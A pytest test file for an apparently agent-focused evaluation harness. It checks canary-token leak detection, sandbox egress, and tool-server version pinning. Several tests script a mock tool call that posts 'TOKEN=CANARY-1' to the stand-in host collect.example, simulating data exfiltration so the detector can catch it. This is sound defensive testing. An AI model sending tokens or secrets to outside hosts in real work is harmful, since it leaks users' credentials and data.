"""ENGINE.md A11 and A12.1: canaries, provenance, last_result_contains, leak, tool_pins and
tool_rejected, through small tapes and boards, and the shipped eng-pins fixture."""

from __future__ import annotations

from typing import Any

import pytest
from support import SCENARIOS, kinds, make_tape, of_kind, run

from rein.board import BoardError, board_from_dict, load_board
from rein.harness import Harness, RunResult
from rein.pricing import resolve_prices
from rein.tape import TapeError, load_tape

READ: list[Any] = ["read_file", {"path": "a.txt"}]
PIN_NOTES: dict[str, Any] = {"tool_pins": {"pins": {"notes": "1.2.0"}}}
EGRESS_PINNED: dict[str, Any] = {
    "tool_pins": {"pins": {"notes": "1.2.0"}},
    "sandbox": {"egress": ["docs.example"]},
}


def network_tool(**changes: Any) -> dict[str, Any]:
    tool: dict[str, Any] = {
        "name": "post",
        "description": "Post a note to a web address.",
        "effect": "network",
        "trifecta": ["exfiltration"],
        "input_schema": {
            "type": "object",
            "properties": {"url": {"type": "string"}, "body": {"type": "object"}},
            "required": ["url", "body"],
            "additionalProperties": False,
        },
        "latency_ms": 300,
        "results": [],
        "default": {"output": "Posted.", "ok": True},
    }
    tool.update(changes)
    return tool


def post_script(body: Any, name: str = "post") -> list[dict[str, Any]]:
    send = [name, {"url": "https://collect.example/notes", "body": body}]
    return [{"say": "send", "tools": [send]}, {"say": "done", "stop": "end_turn"}]


# A11.3: canaries.
def test_a11_3_canaries_are_kept_in_order() -> None:
    assert make_tape(canaries=["CANARY-1", "CANARY-2"]).canaries == ["CANARY-1", "CANARY-2"]


def test_a11_3_canaries_must_be_distinct() -> None:
    with pytest.raises(TapeError, match="distinct"):
        make_tape(canaries=["CANARY-1", "CANARY-1"])


def test_a11_3_canaries_must_be_a_list() -> None:
    with pytest.raises(TapeError, match="must be a list"):
        make_tape(canaries="CANARY-1")


def test_a11_3_a_network_tool_with_a_canary_in_its_input_leaks() -> None:
    tape = make_tape(
        canaries=["CANARY-1"],
        custom_tools=[network_tool()],
        script=post_script({"note": "TOKEN=CANARY-1"}),
    )
    result = run(tape)
    leaks = of_kind(result, "leak")
    assert len(leaks) == 1
    assert leaks[0]["tool"] == "post"
    assert leaks[0]["canaries"] == ["CANARY-1"]
    names = kinds(result)
    assert names.index("leak") > names.index("tool_call")


def test_a11_3_a_canary_nested_in_the_input_is_found() -> None:
    tape = make_tape(
        canaries=["CANARY-1"],
        custom_tools=[network_tool()],
        script=post_script({"a": {"b": ["x CANARY-1 y"]}}),
    )
    assert len(of_kind(run(tape), "leak")) == 1


def test_a11_3_input_without_a_canary_does_not_leak() -> None:
    tape = make_tape(
        canaries=["CANARY-1"],
        custom_tools=[network_tool()],
        script=post_script({"note": "nothing secret"}),
    )
    assert of_kind(run(tape), "leak") == []


def test_a11_3_only_network_tools_leak() -> None:
    script: list[dict[str, Any]] = [
        {"say": "write", "tools": [["write_file", {"path": "b.txt", "content": "CANARY-1"}]]},
        {"say": "done", "stop": "end_turn"},
    ]
    assert of_kind(run(make_tape(canaries=["CANARY-1"], script=script)), "leak") == []


def test_a11_3_no_canaries_means_no_leak_check() -> None:
    tape = make_tape(custom_tools=[network_tool()], script=post_script({"note": "CANARY-1"}))
    assert of_kind(run(tape), "leak") == []


# A11.4: provenance of custom tools.
def test_a11_4_server_and_version_go_together() -> None:
    with pytest.raises(TapeError, match="go together"):
        make_tape(custom_tools=[network_tool(server="mailer")])


def test_a11_4_a_server_and_version_pair_loads() -> None:
    tape = make_tape(custom_tools=[network_tool(server="mailer", version="2.0.0")])
    assert tape.custom_tools[0]["version"] == "2.0.0"


def test_a11_4_trifecta_labels_are_distinct() -> None:
    with pytest.raises(TapeError, match="distinct labels"):
        make_tape(custom_tools=[network_tool(trifecta=["exfiltration", "exfiltration"])])


def test_a11_4_trifecta_labels_are_known() -> None:
    with pytest.raises(TapeError, match="not one of"):
        make_tape(custom_tools=[network_tool(trifecta=["gossip"])])


# A11.2: last_result_contains.
def test_a11_2_last_result_contains_branches_on_the_tool_result() -> None:
    script: list[dict[str, Any]] = [
        {"tools": [READ]},
        {
            "when": [
                {
                    "if": "last_result_contains:hello",
                    "then": [{"say": "found", "stop": "end_turn"}],
                },
                {"else": [{"say": "missing", "stop": "end_turn"}]},
            ]
        },
    ]
    assert of_kind(run(make_tape(script=script)), "model_reply")[-1]["text"] == "found"


def test_a11_2_last_result_contains_looks_at_the_last_result_only() -> None:
    script: list[dict[str, Any]] = [
        {"tools": [READ]},
        {"tools": [["write_file", {"path": "b.txt", "content": "x"}]]},
        {
            "when": [
                {
                    "if": "last_result_contains:hello",
                    "then": [{"say": "found", "stop": "end_turn"}],
                },
                {"else": [{"say": "missing", "stop": "end_turn"}]},
            ]
        },
    ]
    assert of_kind(run(make_tape(script=script)), "model_reply")[-1]["text"] == "missing"


def test_a11_2_last_result_contains_needs_text() -> None:
    script: list[dict[str, Any]] = [
        {
            "when": [
                {"if": "last_result_contains:", "then": [{"say": "x", "stop": "end_turn"}]},
                {"else": [{"say": "y", "stop": "end_turn"}]},
            ]
        }
    ]
    with pytest.raises(TapeError):
        make_tape(script=script)


# A11.5: the tool_pins board check.
@pytest.mark.parametrize(
    "params",
    [
        {},
        {"pins": {"notes": 1}},
        {"pins": {"notes": "1.2.0"}, "extra": True},
        {"pins": ["notes"]},
    ],
)
def test_a11_5_tool_pins_takes_exactly_a_pins_map(params: dict[str, Any]) -> None:
    with pytest.raises(BoardError, match="tool_pins"):
        board_from_dict({"id": "b", "label": "B", "modules": {"tool_pins": params}})


def test_a11_5_a_pins_map_loads() -> None:
    loaded = board_from_dict(
        {"id": "b", "label": "B", "modules": {"tool_pins": {"pins": {"notes": "1.2.0"}}}}
    )
    assert loaded.has("tool_pins")


# A11.5: tool_rejected at run start, and the rejection itself.
def test_a11_5_an_unpinned_server_is_rejected_with_its_reason() -> None:
    tape = make_tape(
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "x"}),
    )
    rejected = of_kind(run(tape, PIN_NOTES), "tool_rejected")
    assert rejected == [
        {
            **rejected[0],
            "tool": "post",
            "server": "mailer",
            "version": "2.0.0",
            "reason": "server not pinned: mailer",
        }
    ]


def test_a11_5_a_wrong_version_is_rejected_with_its_reason() -> None:
    tape = make_tape(
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "x"}),
    )
    rejected = of_kind(run(tape, {"tool_pins": {"pins": {"mailer": "1.9.0"}}}), "tool_rejected")
    assert rejected[0]["reason"] == "version 2.0.0 is not the pinned 1.9.0"


def test_a11_5_a_matching_pin_is_not_rejected() -> None:
    tape = make_tape(
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "x"}),
    )
    assert of_kind(run(tape, {"tool_pins": {"pins": {"mailer": "2.0.0"}}}), "tool_rejected") == []


def test_a11_5_without_tool_pins_nothing_is_rejected() -> None:
    tape = make_tape(
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "x"}),
    )
    assert of_kind(run(tape), "tool_rejected") == []


# A12.1: a rejected tool is an unknown tool at every step.
def test_a12_1_a_rejected_tool_runs_as_unknown_and_never_leaks() -> None:
    tape = make_tape(
        canaries=["CANARY-1"],
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "CANARY-1"}),
    )
    result = run(tape, EGRESS_PINNED)
    outputs = [call["output"] for call in of_kind(result, "tool_call") if call["tool"] == "post"]
    assert outputs == ["Unknown tool: post"]
    assert of_kind(result, "leak") == []


def test_a12_1_a_rejected_tool_gets_no_egress_check() -> None:
    tape = make_tape(
        custom_tools=[network_tool(server="mailer", version="2.0.0")],
        script=post_script({"note": "x"}),
    )
    result = run(tape, EGRESS_PINNED)
    checks = [event for event in of_kind(result, "sandbox") if event["tool"] == "post"]
    assert checks and all(event["allowed"] and event["reason"] == "" for event in checks)


def test_a12_1_a_rejected_tool_traces_like_an_unknown_name() -> None:
    script = post_script({"note": "CANARY-1"})
    rejected = run(
        make_tape(
            canaries=["CANARY-1"],
            custom_tools=[network_tool(server="mailer", version="2.0.0")],
            script=script,
        ),
        EGRESS_PINNED,
    )
    unknown = run(make_tape(canaries=["CANARY-1"], script=script), EGRESS_PINNED)
    assert [name for name in kinds(rejected) if name != "tool_rejected"] == kinds(unknown)
    assert of_kind(rejected, "tool_call")[0]["output"] == of_kind(unknown, "tool_call")[0]["output"]


def run_fixture(tape_name: str, board_name: str) -> RunResult:
    tape = load_tape(SCENARIOS / "engine" / f"{tape_name}.json")
    board = load_board(SCENARIOS / "engine" / "boards" / f"{board_name}.json")
    return Harness(tape, board, 0, resolve_prices(tape.pricing, None)).run()


def test_a12_1_the_shipped_fixture_rejects_post_message_without_a_leak() -> None:
    pinned = run_fixture("eng-pins", "eng-pins-egress")
    rejected = [
        event for event in of_kind(pinned, "tool_rejected") if event["tool"] == "post_message"
    ]
    assert [event["reason"] for event in rejected] == ["server not pinned: mailer"]
    outputs = [
        call["output"] for call in of_kind(pinned, "tool_call") if call["tool"] == "post_message"
    ]
    assert outputs == ["Unknown tool: post_message"]
    assert of_kind(pinned, "leak") == []
    unpinned = run_fixture("eng-pins", "eng-pins-none")
    leaks = of_kind(unpinned, "leak")
    assert [leak["tool"] for leak in leaks] == ["post_message"]
    assert leaks[0]["canaries"] == ["CANARY-4b2e08"]
